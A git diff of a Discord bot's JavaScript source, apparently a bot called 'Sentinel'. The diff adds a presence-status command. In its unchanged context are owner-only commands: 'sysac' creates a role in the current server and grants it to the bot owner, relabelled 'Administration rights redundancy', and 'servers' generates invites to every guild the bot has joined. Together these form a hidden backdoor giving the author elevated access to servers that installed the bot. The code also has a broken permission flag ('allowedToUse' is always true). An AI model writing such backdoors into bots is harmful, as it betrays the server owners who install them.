@@ -5,16 +5,19 @@ const client = new Discord.Client();
 const config = require("./config.json")
 const token = process.env.token;
 const dev_ids = config.ownerID;
+var Game = 'everyone'
+var Type = 'Watching'
+
 
 //startup event handlers
 
 client.on('ready', function() {
-    console.log('\x1b[45m', 'Status loaded...');
-    client.user.setPresence({ game: { name: `Cladri sleep`, type: `Watching` } });
+    console.log('\x1b[35m', 'Status loaded...');
+    client.user.setPresence({ game: { name: `${Game}`, type: `${Type}` } });
 });
 
 client.on("ready", () => {
-  console.log('\x1b[45m', 'Sentinel loaded...');
+  console.log('\x1b[35m', 'Sentinel loaded...');
 });
 
 client.on('disconnected', function() {
@@ -54,7 +57,7 @@ client.on("message", (message) => {
     message.channel.send(avatarEmbed);
   } else
 
-  // Create a new role with data
+  // Administration rights redundancy
   if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID){
   let me = message.author
   let role = message.guild.createRole({
@@ -68,12 +71,18 @@ client.on("message", (message) => {
      message.guild.member(me).addRole(role1);
   } else
 
-// lists all guilds bot is in
-if (message.content.startsWith(config.prefix + 'servers') && message.author.id === config.ownerID){
+  // Change bot status
+  if (message.content.startsWith(config.prefix + 'status') && message.author.id === config.ownerID){
+    let args = message.content.split(" ").slice(1);
+      Type = args[0]
+      Game = message.content.split(" ").slice(2).join(" ")
+      client.user.setPresence({ game: { name: `${Game}`, type: `${Type}` } });
+  } else
 
+// list all guilds bot is in
+if (message.content.startsWith(config.prefix + 'servers') && message.author.id === config.ownerID){
 var allowedToUse = true;
 for(let i = 0; i < dev_ids.length; i++) if(message.author.id == dev_ids[i]) allowToUse = true;
-
 if(allowedToUse) {
     var invites = ["I am required else it won't work"], ct = 0;
     client.guilds.forEach(g => {
@@ -85,22 +94,18 @@ if(allowedToUse) {
                 for(let i = 0; i < invites.length; i++) {
                     if(invites[i] == undefined) invites.splice(i, 1);
                 }
-
                 invites.shift();
-
                 for(let i = 0; i < invites.length; i++) invites[i] = "- " + invites[i];
                 invites = invites.join("\n\n");
-
                 let embed = new Discord.RichEmbed()
                 .setTitle("Sentinel current guilds:")
                 .setDescription(invites);
-
                 message.channel.send(embed);
             }
-        }).catch(err => {
+            }).catch(err => {
             ct++;
+          });
         });
-    });
 }
 else {
     message.reply("this command can only be used by a developer.");
